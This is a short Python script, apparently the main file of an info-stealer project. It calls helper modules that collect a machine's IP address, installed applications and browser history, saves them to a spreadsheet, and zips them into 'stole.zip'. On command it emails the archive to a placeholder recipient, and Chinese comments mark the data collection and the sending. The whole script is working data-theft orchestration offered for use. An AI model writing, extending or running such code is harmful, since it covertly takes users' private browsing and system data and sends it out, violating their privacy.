from get_ip import get_ip
from get_application import get_app
from get_broswer_history import get_broswer
import email_sent
import data
import shutil


def run():
    get_ip()
    get_app()
    get_broswer()
    data.write_to_excel()
    compress_folder(".\\user","stole")
    # print("数据获取完毕")

    while True:
        user_input = input("Enter 'quit' to exit: ")
        if user_input.lower() == 'quit':
            print("Exiting...")
            break
        elif user_input.lower()=='send':
            ##发送三个数据文件
            filename = "stole.zip"  # 要发送的文件名
            recipient_email = "xxx1"  # 接收者邮箱地址
            email_sent.send_email(filename, recipient_email)
        else:
            print("You entered:", user_input)




def compress_folder(folder_path, output_filename):
    shutil.make_archive(output_filename, 'zip', folder_path)






if __name__ == "__main__":
    run()

